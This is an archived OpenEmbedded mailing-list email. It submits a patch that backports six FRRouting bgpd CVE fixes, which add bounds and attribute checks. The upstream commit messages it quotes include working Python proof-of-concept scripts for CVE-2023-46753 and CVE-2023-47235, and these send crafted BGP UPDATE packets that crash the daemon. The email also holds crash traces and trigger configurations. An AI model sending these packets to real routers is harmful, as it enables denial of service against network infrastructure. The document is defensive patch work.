Return-Path: <narpat.mali@windriver.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 4A5C6C54FB9
	for <webhook@archiver.kernel.org>; Tue, 21 Nov 2023 08:03:08 +0000 (UTC)
Received: from mx0b-0064b401.pphosted.com (mx0b-0064b401.pphosted.com [205.220.178.238])
 by mx.groups.io with SMTP id smtpd.web10.31256.1700553781808056746
 for <openembedded-devel@lists.openembedded.org>;
 Tue, 21 Nov 2023 00:03:02 -0800
Authentication-Results: mx.groups.io;
 dkim=pass header.i=@windriver.com header.s=PPS06212021 header.b=bV71cLkF;
 spf=permerror, err=parse error for token &{10 18 %{ir}.%{v}.%{d}.spf.has.pphosted.com}: invalid domain name (domain: windriver.com, ip: 205.220.178.238, mailfrom: prvs=96893ceb36=narpat.mali@windriver.com)
Received: from pps.filterd (m0250811.ppops.net [127.0.0.1])
	by mx0a-0064b401.pphosted.com (8.17.1.24/8.17.1.24) with ESMTP id 3AL6xUh5012970;
	Tue, 21 Nov 2023 08:03:00 GMT
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=windriver.com;
	 h=from:to:subject:date:message-id:mime-version
	:content-transfer-encoding:content-type; s=PPS06212021; bh=Edq0s
	go82iKEtjg+ltfhlfVUnZv4bAZU8KzNwnkbxH8=; b=bV71cLkFj2RYrJqw//WzG
	u8MWmKkX+OB8uri5TtzFXjPTlQ5t5oFGeZBVW8ATfcafwo5vAModZHigbF/6E1j7
	hhu2zCt/eCVNdJ0vXm7NKmXjO1ZxE9r3jEpEkM7w3CIsZUtxSPs/PCMqybz76hkc
	L6+f+njYMNb8G5L9m5GzMEWg6WD6qCiWhgKsQjXhTqFg2n6RrjAgNptKdhBHr1h0
	ReMMzv2DfuK7/8vOK7R+ai+O+nSiq99HI+7Ahz/4h3goe9ZMRXJKXQtitqDJgZ/5
	DFsUz4SJMQRYFMCDcxqa22r1W9ZumdPgUxpLDDDJPLsS3pgdNuPiiD9YbRyD/eou
	g==
Received: from ala-exchng01.corp.ad.wrs.com (ala-exchng01.wrs.com [147.11.82.252])
	by mx0a-0064b401.pphosted.com (PPS) with ESMTPS id 3uejfwta3v-1
	(version=TLSv1.2 cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NOT);
	Tue, 21 Nov 2023 08:02:59 +0000 (GMT)
Received: from blr-linux-engg1.wrs.com (147.11.136.210) by
 ala-exchng01.corp.ad.wrs.com (147.11.82.252) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2507.34; Tue, 21 Nov 2023 00:03:02 -0800
From: nmali <narpat.mali@windriver.com>
To: <openembedded-devel@lists.openembedded.org>, <akuster808@gmail.com>
Subject: [meta-networking][kirkstone][PATCH 1/1] frr: Fix for multiple CVE's
Date: Tue, 21 Nov 2023 08:02:36 +0000
Message-ID: <20231121080236.192027-1-narpat.mali@windriver.com>
X-Mailer: git-send-email 2.40.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
Content-Type: text/plain
X-Originating-IP: [147.11.136.210]
X-ClientProxiedBy: ala-exchng01.corp.ad.wrs.com (147.11.82.252) To
 ala-exchng01.corp.ad.wrs.com (147.11.82.252)
X-Proofpoint-GUID: yF29hcvFpw6R8t5IEwenyVXxS50DkTZM
X-Proofpoint-ORIG-GUID: yF29hcvFpw6R8t5IEwenyVXxS50DkTZM
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.272,Aquarius:18.0.987,Hydra:6.0.619,FMLib:17.11.176.26
 definitions=2023-11-16_25,2023-11-16_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0 spamscore=0 mlxlogscore=999
 bulkscore=0 lowpriorityscore=0 clxscore=1015 mlxscore=0 impostorscore=0
 priorityscore=1501 adultscore=0 phishscore=0 malwarescore=0 suspectscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.19.0-2311060001
 definitions=main-2311210061
List-Id: <openembedded-devel.lists.openembedded.org>
X-Webhook-Received: from li982-79.members.linode.com [45.33.32.79] by
 aws-us-west-2-korg-lkml-1.web.codeaurora.org with HTTPS for
 <openembedded-devel@lists.openembedded.org>; Tue, 21 Nov 2023 08:03:08 -0000
X-Groupsio-URL: https://lists.openembedded.org/g/openembedded-devel/message/106974

From: Narpat Mali <narpat.mali@windriver.com>

Backport the below CVE fixes.
CVE-2023-38406: https://security-tracker.debian.org/tracker/CVE-2023-38406
CVE-2023-38407: https://security-tracker.debian.org/tracker/CVE-2023-38407
CVE-2023-46752: https://security-tracker.debian.org/tracker/CVE-2023-46752
CVE-2023-46753: https://security-tracker.debian.org/tracker/CVE-2023-46753
CVE-2023-47234: https://security-tracker.debian.org/tracker/CVE-2023-47234
CVE-2023-47235: https://security-tracker.debian.org/tracker/CVE-2023-47235

Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
---
 .../frr/frr/CVE-2023-38406.patch              |  42 ++++++
 .../frr/frr/CVE-2023-38407.patch              |  63 +++++++++
 .../frr/frr/CVE-2023-46752.patch              | 127 ++++++++++++++++++
 .../frr/frr/CVE-2023-46753.patch              | 119 ++++++++++++++++
 .../frr/frr/CVE-2023-47234.patch              |  98 ++++++++++++++
 .../frr/frr/CVE-2023-47235.patch              | 114 ++++++++++++++++
 .../recipes-protocols/frr/frr_8.2.2.bb        |   6 +
 7 files changed, 569 insertions(+)
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-38406.patch
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-38407.patch
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
 create mode 100644 meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch

diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-38406.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-38406.patch
new file mode 100644
index 0000000000..9d5f306fe4
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-38406.patch
@@ -0,0 +1,42 @@
+From f2a5c583fc8f7c515f3d6e6f929dcbcc61f7e4b7 Mon Sep 17 00:00:00 2001
+From: Donald Sharp <sharpd@nvidia.com>
+Date: Mon, 20 Nov 2023 11:43:27 +0000
+Subject: [PATCH 1/6] bgpd: Flowspec overflow issue
+
+According to the flowspec RFC 8955 a flowspec nlri is <length, <nlri data>>
+Specifying 0 as a length makes BGP get all warm on the inside.  Which
+in this case is not a good thing at all.  Prevent warmth, stay cold
+on the inside.
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donald Sharp <sharpd@nvidia.com>
+
+CVE: CVE-2023-38406
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/0b999c886e241c52bd1f7ef0066700e4b618ebb3]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_flowspec.c | 7 +++++++
+ 1 file changed, 7 insertions(+)
+
+diff --git a/bgpd/bgp_flowspec.c b/bgpd/bgp_flowspec.c
+index 3e2b1ac49..95fbd340a 100644
+--- a/bgpd/bgp_flowspec.c
++++ b/bgpd/bgp_flowspec.c
+@@ -148,6 +148,13 @@ int bgp_nlri_parse_flowspec(struct peer *peer, struct attr *attr,
+				psize);
+			return BGP_NLRI_PARSE_ERROR_PACKET_OVERFLOW;
+		}
++
++		if (psize == 0) {
++			flog_err(EC_BGP_FLOWSPEC_PACKET,
++				 "Flowspec NLRI length 0 which makes no sense");
++			return BGP_NLRI_PARSE_ERROR_PACKET_OVERFLOW;
++		}
++
+		if (bgp_fs_nlri_validate(pnt, psize, afi) < 0) {
+			flog_err(
+				EC_BGP_FLOWSPEC_PACKET,
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-38407.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-38407.patch
new file mode 100644
index 0000000000..782b44615a
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-38407.patch
@@ -0,0 +1,63 @@
+From 3880f66bd053d1f56af74852ca57ba166d880920 Mon Sep 17 00:00:00 2001
+From: Donald Sharp <sharpd@nvidia.com>
+Date: Mon, 20 Nov 2023 12:03:29 +0000
+Subject: [PATCH 2/6] bgpd: Fix use beyond end of stream of labeled unicast
+ parsing
+
+Fixes a couple crashes associated with attempting to read
+beyond the end of the stream.
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donald Sharp <sharpd@nvidia.com>
+
+CVE: CVE-2023-38407
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/7404a914b0cafe046703c8381903a80d3def8f8b]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_label.c | 15 +++++++++++++++
+ 1 file changed, 15 insertions(+)
+
+diff --git a/bgpd/bgp_label.c b/bgpd/bgp_label.c
+index 4a20f2c09..b65c98e86 100644
+--- a/bgpd/bgp_label.c
++++ b/bgpd/bgp_label.c
+@@ -299,6 +299,9 @@ static int bgp_nlri_get_labels(struct peer *peer, uint8_t *pnt, uint8_t plen,
+	uint8_t llen = 0;
+	uint8_t label_depth = 0;
+
++	if (plen < BGP_LABEL_BYTES)
++		return 0;
++
+	for (; data < lim; data += BGP_LABEL_BYTES) {
+		memcpy(label, data, BGP_LABEL_BYTES);
+		llen += BGP_LABEL_BYTES;
+@@ -361,6 +364,9 @@ int bgp_nlri_parse_label(struct peer *peer, struct attr *attr,
+			memcpy(&addpath_id, pnt, BGP_ADDPATH_ID_LEN);
+			addpath_id = ntohl(addpath_id);
+			pnt += BGP_ADDPATH_ID_LEN;
++
++			if (pnt >= lim)
++				return BGP_NLRI_PARSE_ERROR_PACKET_OVERFLOW;
+		}
+
+		/* Fetch prefix length. */
+@@ -379,6 +385,15 @@ int bgp_nlri_parse_label(struct peer *peer, struct attr *attr,
+
+		/* Fill in the labels */
+		llen = bgp_nlri_get_labels(peer, pnt, psize, &label);
++		if (llen == 0) {
++			flog_err(
++				EC_BGP_UPDATE_RCV,
++				"%s [Error] Update packet error (wrong label length 0)",
++				peer->host);
++			bgp_notify_send(peer, BGP_NOTIFY_UPDATE_ERR,
++					BGP_NOTIFY_UPDATE_INVAL_NETWORK);
++			return BGP_NLRI_PARSE_ERROR_LABEL_LENGTH;
++		}
+		p.prefixlen = prefixlen - BSIZE(llen);
+
+		/* There needs to be at least one label */
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
new file mode 100644
index 0000000000..17ba41037c
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46752.patch
@@ -0,0 +1,127 @@
+From 1c4882b83a1db705abd5d384dd0b7ef4c0e3b4ee Mon Sep 17 00:00:00 2001
+From: Donatas Abraitis <donatas@opensourcerouting.org>
+Date: Mon, 20 Nov 2023 14:11:13 +0000
+Subject: [PATCH 3/6] bgpd: Handle MP_REACH_NLRI malformed packets with session
+ reset
+
+Avoid crashing bgpd.
+
+```
+(gdb)
+bgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341
+2341			stream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);
+(gdb)
+stream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320
+320	{
+(gdb)
+321		STREAM_VERIFY_SANE(s);
+(gdb)
+323		if (STREAM_READABLE(s) < size) {
+(gdb)
+34	  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));
+(gdb)
+
+Thread 1 "bgpd" received signal SIGSEGV, Segmentation fault.
+0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,
+    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282
+2282		if (path->attr->aspath->refcnt)
+(gdb)
+```
+
+With the configuration:
+
+```
+ neighbor 127.0.0.1 remote-as external
+ neighbor 127.0.0.1 passive
+ neighbor 127.0.0.1 ebgp-multihop
+ neighbor 127.0.0.1 disable-connected-check
+ neighbor 127.0.0.1 update-source 127.0.0.2
+ neighbor 127.0.0.1 timers 3 90
+ neighbor 127.0.0.1 timers connect 1
+ address-family ipv4 unicast
+  redistribute connected
+  neighbor 127.0.0.1 default-originate
+  neighbor 127.0.0.1 route-map RM_IN in
+ exit-address-family
+!
+route-map RM_IN permit 10
+ set as-path prepend 200
+exit
+```
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
+
+CVE: CVE-2023-46752
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/b08afc81c60607a4f736f418f2e3eb06087f1a35]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_attr.c   | 6 +-----
+ bgpd/bgp_attr.h   | 1 -
+ bgpd/bgp_packet.c | 6 +-----
+ 3 files changed, 2 insertions(+), 11 deletions(-)
+
+diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
+index b10a60351..e0542356c 100644
+--- a/bgpd/bgp_attr.c
++++ b/bgpd/bgp_attr.c
+@@ -2207,7 +2207,7 @@ int bgp_mp_reach_parse(struct bgp_attr_parser_args *args,
+
+		mp_update->afi = afi;
+		mp_update->safi = safi;
+-		return BGP_ATTR_PARSE_EOR;
++		return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);
+	}
+
+	mp_update->afi = afi;
+@@ -3345,10 +3345,6 @@ bgp_attr_parse_ret_t bgp_attr_parse(struct peer *peer, struct attr *attr,
+			goto done;
+		}
+
+-		if (ret == BGP_ATTR_PARSE_EOR) {
+-			goto done;
+-		}
+-
+		if (ret == BGP_ATTR_PARSE_ERROR) {
+			flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,
+				  "%s: Attribute %s, parse error", peer->host,
+diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
+index 781bfdec3..69f962134 100644
+--- a/bgpd/bgp_attr.h
++++ b/bgpd/bgp_attr.h
+@@ -378,7 +378,6 @@ typedef enum {
+	/* only used internally, send notify + convert to BGP_ATTR_PARSE_ERROR
+	   */
+	BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,
+-	BGP_ATTR_PARSE_EOR = -4,
+ } bgp_attr_parse_ret_t;
+
+ struct bpacket_attr_vec_arr;
+diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
+index 2fd28aae3..261695198 100644
+--- a/bgpd/bgp_packet.c
++++ b/bgpd/bgp_packet.c
+@@ -1843,8 +1843,7 @@ static int bgp_update_receive(struct peer *peer, bgp_size_t size)
+	 * Non-MP IPv4/Unicast EoR is a completely empty UPDATE
+	 * and MP EoR should have only an empty MP_UNREACH
+	 */
+-	if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)
+-	    || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {
++	if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {
+		afi_t afi = 0;
+		safi_t safi;
+		struct graceful_restart_info *gr_info;
+@@ -1865,9 +1864,6 @@ static int bgp_update_receive(struct peer *peer, bgp_size_t size)
+			   && nlris[NLRI_MP_WITHDRAW].length == 0) {
+			afi = nlris[NLRI_MP_WITHDRAW].afi;
+			safi = nlris[NLRI_MP_WITHDRAW].safi;
+-		} else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {
+-			afi = nlris[NLRI_MP_UPDATE].afi;
+-			safi = nlris[NLRI_MP_UPDATE].safi;
+		}
+
+		if (afi && peer->afc[afi][safi]) {
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
new file mode 100644
index 0000000000..855eb190db
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-46753.patch
@@ -0,0 +1,119 @@
+From 60bd794a9cf6df05503a062e113161dcbdbfac9d Mon Sep 17 00:00:00 2001
+From: Donatas Abraitis <donatas@opensourcerouting.org>
+Date: Mon, 20 Nov 2023 14:22:22 +0000
+Subject: [PATCH 4/6] bgpd: Check mandatory attributes more carefully for
+ UPDATE message
+
+If we send a crafted BGP UPDATE message without mandatory attributes, we do
+not check if the length of the path attributes is zero or not. We only check
+if attr->flag is at least set or not. Imagine we send only unknown transit
+attribute, then attr->flag is always 0. Also, this is true only if graceful-restart
+capability is received.
+
+A crash:
+
+```
+bgpd[7834]: [TJ23Y-GY0RH] 127.0.0.1 Unknown attribute is received (type 31, length 16)
+bgpd[7834]: [PCFFM-WMARW] 127.0.0.1(donatas-pc) rcvd UPDATE wlen 0 attrlen 20 alen 17
+BGP[7834]: Received signal 11 at 1698089639 (si_addr 0x0, PC 0x55eefd375b4a); aborting...
+BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_backtrace_sigsafe+0x6d) [0x7f3205ca939d]
+BGP[7834]: /usr/local/lib/libfrr.so.0(zlog_signal+0xf3) [0x7f3205ca9593]
+BGP[7834]: /usr/local/lib/libfrr.so.0(+0xf5181) [0x7f3205cdd181]
+BGP[7834]: /lib/x86_64-linux-gnu/libpthread.so.0(+0x12980) [0x7f3204ff3980]
+BGP[7834]: /usr/lib/frr/bgpd(+0x18ab4a) [0x55eefd375b4a]
+BGP[7834]: /usr/local/lib/libfrr.so.0(route_map_apply_ext+0x310) [0x7f3205cd1290]
+BGP[7834]: /usr/lib/frr/bgpd(+0x163610) [0x55eefd34e610]
+BGP[7834]: /usr/lib/frr/bgpd(bgp_update+0x9a5) [0x55eefd35c1d5]
+BGP[7834]: /usr/lib/frr/bgpd(bgp_nlri_parse_ip+0xb7) [0x55eefd35e867]
+BGP[7834]: /usr/lib/frr/bgpd(+0x1555e6) [0x55eefd3405e6]
+BGP[7834]: /usr/lib/frr/bgpd(bgp_process_packet+0x747) [0x55eefd345597]
+BGP[7834]: /usr/local/lib/libfrr.so.0(event_call+0x83) [0x7f3205cef4a3]
+BGP[7834]: /usr/local/lib/libfrr.so.0(frr_run+0xc0) [0x7f3205ca10a0]
+BGP[7834]: /usr/lib/frr/bgpd(main+0x409) [0x55eefd2dc979]
+```
+
+Sending:
+
+```
+import socket
+import time
+
+OPEN = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
+b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
+b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
+b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
+b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
+b"\x80\x00\x00\x00")
+
+KEEPALIVE = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
+
+UPDATE = bytearray.fromhex("ffffffffffffffffffffffffffffffff003c0200000014ff1f001000040146464646460004464646464646664646f50d05800100010200ffff000000")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.2', 179))
+s.send(OPEN)
+data = s.recv(1024)
+s.send(KEEPALIVE)
+data = s.recv(1024)
+s.send(UPDATE)
+data = s.recv(1024)
+time.sleep(1000)
+s.close()
+```
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
+
+CVE: CVE-2023-46753
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/d8482bf011cb2b173e85b65b4bf3d5061250cdb9]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_attr.c | 10 ++++++----
+ 1 file changed, 6 insertions(+), 4 deletions(-)
+
+diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
+index e0542356c..35122943e 100644
+--- a/bgpd/bgp_attr.c
++++ b/bgpd/bgp_attr.c
+@@ -3044,13 +3044,15 @@ static bgp_attr_parse_ret_t bgp_attr_unknown(struct bgp_attr_parser_args *args)
+ }
+
+ /* Well-known attribute check. */
+-static int bgp_attr_check(struct peer *peer, struct attr *attr)
++static int bgp_attr_check(struct peer *peer, struct attr *attr,
++			  bgp_size_t length)
+ {
+	uint8_t type = 0;
+
+	/* BGP Graceful-Restart End-of-RIB for IPv4 unicast is signaled as an
+	 * empty UPDATE.  */
+-	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)
++	if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&
++	    !length)
+		return BGP_ATTR_PARSE_PROCEED;
+
+	/* "An UPDATE message that contains the MP_UNREACH_NLRI is not required
+@@ -3101,7 +3103,7 @@ bgp_attr_parse_ret_t bgp_attr_parse(struct peer *peer, struct attr *attr,
+	bgp_attr_parse_ret_t ret;
+	uint8_t flag = 0;
+	uint8_t type = 0;
+-	bgp_size_t length;
++	bgp_size_t length = 0;
+	uint8_t *startp, *endp;
+	uint8_t *attr_endp;
+	uint8_t seen[BGP_ATTR_BITMAP_SIZE];
+@@ -3416,7 +3418,7 @@ bgp_attr_parse_ret_t bgp_attr_parse(struct peer *peer, struct attr *attr,
+	}
+
+	/* Check all mandatory well-known attributes are present */
+-	ret = bgp_attr_check(peer, attr);
++	ret = bgp_attr_check(peer, attr, length);
+	if (ret < 0)
+		goto done;
+
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
new file mode 100644
index 0000000000..9bf63372a4
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47234.patch
@@ -0,0 +1,98 @@
+From 682f100cd8d1bf7510939faa033f69ce64f965e9 Mon Sep 17 00:00:00 2001
+From: Donatas Abraitis <donatas@opensourcerouting.org>
+Date: Mon, 20 Nov 2023 14:32:38 +0000
+Subject: [PATCH 5/6] bgpd: Ignore handling NLRIs if we received
+ MP_UNREACH_NLRI
+
+If we receive MP_UNREACH_NLRI, we should stop handling remaining NLRIs if
+no mandatory path attributes received.
+
+In other words, if MP_UNREACH_NLRI received, the remaining NLRIs should be handled
+as a new data, but without mandatory attributes, it's a malformed packet.
+
+In normal case, this MUST not happen at all, but to avoid crashing bgpd, we MUST
+handle that.
+
+Reported-by: Iggy Frankovic <iggyfran@amazon.com>
+Signed-off-by: Donatas Abraitis <donatas@opensourcerouting.org>
+
+CVE: CVE-2023-47234
+
+Upstream-Status: Backport [https://github.com/FRRouting/frr/commit/c37119df45bbf4ef713bc10475af2ee06e12f3bf]
+
+Signed-off-by: Narpat Mali <narpat.mali@windriver.com>
+---
+ bgpd/bgp_attr.c   | 19 ++++++++++---------
+ bgpd/bgp_attr.h   |  1 +
+ bgpd/bgp_packet.c |  7 ++++++-
+ 3 files changed, 17 insertions(+), 10 deletions(-)
+
+diff --git a/bgpd/bgp_attr.c b/bgpd/bgp_attr.c
+index 35122943e..13da27e99 100644
+--- a/bgpd/bgp_attr.c
++++ b/bgpd/bgp_attr.c
+@@ -3055,15 +3055,6 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
+	    !length)
+		return BGP_ATTR_PARSE_PROCEED;
+
+-	/* "An UPDATE message that contains the MP_UNREACH_NLRI is not required
+-	   to carry any other path attributes.", though if MP_REACH_NLRI or NLRI
+-	   are present, it should.  Check for any other attribute being present
+-	   instead.
+-	 */
+-	if ((!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
+-	     CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI))))
+-		return BGP_ATTR_PARSE_PROCEED;
+-
+	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_ORIGIN)))
+		type = BGP_ATTR_ORIGIN;
+
+@@ -3082,6 +3073,16 @@ static int bgp_attr_check(struct peer *peer, struct attr *attr,
+	    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_LOCAL_PREF)))
+		type = BGP_ATTR_LOCAL_PREF;
+
++	/* An UPDATE message that contains the MP_UNREACH_NLRI is not required
++	 * to carry any other path attributes. Though if MP_REACH_NLRI or NLRI
++	 * are present, it should. Check for any other attribute being present
++	 * instead.
++	 */
++	if (!CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI)) &&
++	    CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_UNREACH_NLRI)))
++		return type ? BGP_ATTR_PARSE_MISSING_MANDATORY
++			    : BGP_ATTR_PARSE_PROCEED;
++
+	/* If any of the well-known mandatory attributes are not present
+	 * in an UPDATE message, then "treat-as-withdraw" MUST be used.
+	 */
+diff --git a/bgpd/bgp_attr.h b/bgpd/bgp_attr.h
+index 69f962134..77640dd5b 100644
+--- a/bgpd/bgp_attr.h
++++ b/bgpd/bgp_attr.h
+@@ -378,6 +378,7 @@ typedef enum {
+	/* only used internally, send notify + convert to BGP_ATTR_PARSE_ERROR
+	   */
+	BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,
++	BGP_ATTR_PARSE_MISSING_MANDATORY = -4,
+ } bgp_attr_parse_ret_t;
+
+ struct bpacket_attr_vec_arr;
+diff --git a/bgpd/bgp_packet.c b/bgpd/bgp_packet.c
+index 261695198..c1c28f344 100644
+--- a/bgpd/bgp_packet.c
++++ b/bgpd/bgp_packet.c
+@@ -1767,7 +1767,12 @@ static int bgp_update_receive(struct peer *peer, bgp_size_t size)
+	/* Network Layer Reachability Information. */
+	update_len = end - stream_pnt(s);
+
+-	if (update_len && attribute_len) {
++	/* If we received MP_UNREACH_NLRI attribute, but also NLRIs, then
++	 * NLRIs should be handled as a new data. Though, if we received
++	 * NLRIs without mandatory attributes, they should be ignored.
++	 */
++	if (update_len && attribute_len &&
++	    attr_parse_ret != BGP_ATTR_PARSE_MISSING_MANDATORY) {
+		/* Set NLRI portion to structure. */
+		nlris[NLRI_UPDATE].afi = AFI_IP;
+		nlris[NLRI_UPDATE].safi = SAFI_UNICAST;
+--
+2.40.0
diff --git a/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
new file mode 100644
index 0000000000..218dcba510
--- /dev/null
+++ b/meta-networking/recipes-protocols/frr/frr/CVE-2023-47235.patch
@@ -0,0 +1,114 @@
+From 024bdfcdf1d52db3a74f00a3370c3834a4bb78d0 Mon Sep 17 00:00:00 2001
+From: Donatas Abraitis <donatas@opensourcerouting.org>
+Date: Mon, 20 Nov 2023 14:39:33 +0000
+Subject: [PATCH 6/6] bgpd: Treat EOR as withdrawn to avoid unwanted handling
+ of malformed attrs
+
+Treat-as-withdraw, otherwise if we just ignore it, we will pass it to be
+processed as a normal UPDATE without mandatory attributes, that could lead
+to harmful behavior. In this case, a crash for route-maps with the configuration
+such as:
+
+```
+router bgp 65001
+ no bgp ebgp-requires-policy
+ neighbor 127.0.0.1 remote-as external
+ neighbor 127.0.0.1 passive
+ neighbor 127.0.0.1 ebgp-multihop
+ neighbor 127.0.0.1 disable-connected-check
+ neighbor 127.0.0.1 update-source 127.0.0.2
+ neighbor 127.0.0.1 timers 3 90
+ neighbor 127.0.0.1 timers connect 1
+ !
+ address-family ipv4 unicast
+  neighbor 127.0.0.1 addpath-tx-all-paths
+  neighbor 127.0.0.1 default-originate
+  neighbor 127.0.0.1 route-map RM_IN in
+ exit-address-family
+exit
+!
+route-map RM_IN permit 10
+ set as-path prepend 200
+exit
+```
+
+Send a malformed optional transitive attribute:
+
+```
+import socket
+import time
+
+OPEN = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+b"\xff\xff\x00\x62\x01\x04\xfd\xea\x00\x5a\x0a\x00\x00\x01\x45\x02"
+b"\x06\x01\x04\x00\x01\x00\x01\x02\x02\x02\x00\x02\x02\x46\x00\x02"
+b"\x06\x41\x04\x00\x00\xfd\xea\x02\x02\x06\x00\x02\x06\x45\x04\x00"
+b"\x01\x01\x03\x02\x0e\x49\x0c\x0a\x64\x6f\x6e\x61\x74\x61\x73\x2d"
+b"\x70\x63\x00\x02\x04\x40\x02\x00\x78\x02\x09\x47\x07\x00\x01\x01"
+b"\x80\x00\x00\x00")
+
+KEEPALIVE = (b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff"
+b"\xff\xff\xff\xff\xff\xff\x00\x13\x04")
+
+UPDATE = bytearray.fromhex("ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.2', 179))
+s.send(OPEN)
+data = s.recv(1024)
+s.send(KEEPALIVE)
+data = s.recv(1024)
+s.send(UPDATE)
